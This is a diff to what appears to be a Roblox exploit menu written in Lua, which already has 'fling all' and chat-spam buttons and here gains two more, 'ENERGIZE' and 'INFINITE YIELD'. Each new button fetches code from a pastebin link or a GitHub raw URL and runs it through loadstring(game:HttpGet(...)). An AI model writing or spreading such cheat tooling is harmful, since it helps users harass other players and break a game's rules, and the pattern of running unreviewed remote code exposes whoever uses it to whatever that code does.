@@ -8,6 +8,8 @@ local Frame = Instance.new("Frame")
 local TextLabel = Instance.new("TextLabel")
 local FLINGALL = Instance.new("TextButton")
 local SpamCHAT = Instance.new("TextButton")
+local ENERGIZE = Instance.new("TextButton")
+local IY = Instance.new("TextButton")
  
 --Properties:
  
@@ -88,7 +90,36 @@ local A_2 = "All"
 local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
 Event:FireServer(A_1, A_2)
 end)
-
+ENERGIZE.Parent = Frame
+ENERGIZE.BackgroundColor3 = Color3.fromRGB(226, 155, 64)
+ENERGIZE.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ENERGIZE.BorderSizePixel = 3
+ENERGIZE.Position = UDim2.new(0, 0, 0.7, 0)
+ENERGIZE.Size = UDim2.new(0, 100, 0, 25)
+ENERGIZE.Font = Enum.Font.SourceSans
+ENERGIZE.Text = "ENERGIZE"
+ENERGIZE.TextColor3 = Color3.fromRGB(0, 0, 0)
+ENERGIZE.TextScaled = true
+ENERGIZE.TextSize = 14.000
+ENERGIZE.TextWrapped = true
+ENERGIZE.MouseButton1Down:connect(function()
+loadstring(game:HttpGet("https://pastebin.com/raw/Rx4Qqicd"))()
+end)
+IY.Parent = Frame
+IY.BackgroundColor3 = Color3.fromRGB(226, 155, 64)
+IY.BorderColor3 = Color3.fromRGB(0, 0, 0)
+IY.BorderSizePixel = 3
+IY.Position = UDim2.new(0, 0, 0.6, 0)
+IY.Size = UDim2.new(0, 100, 0, 25)
+IY.Font = Enum.Font.SourceSans
+IY.Text = "INFINITE YIELD"
+IY.TextColor3 = Color3.fromRGB(0, 0, 0)
+IY.TextScaled = true
+IY.TextSize = 14.000
+IY.TextWrapped = true
+IY.MouseButton1Down:connect(function()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+end)
 -- Scripts:
 
 local function QFCS_fake_script() -- Frame.Dragify 
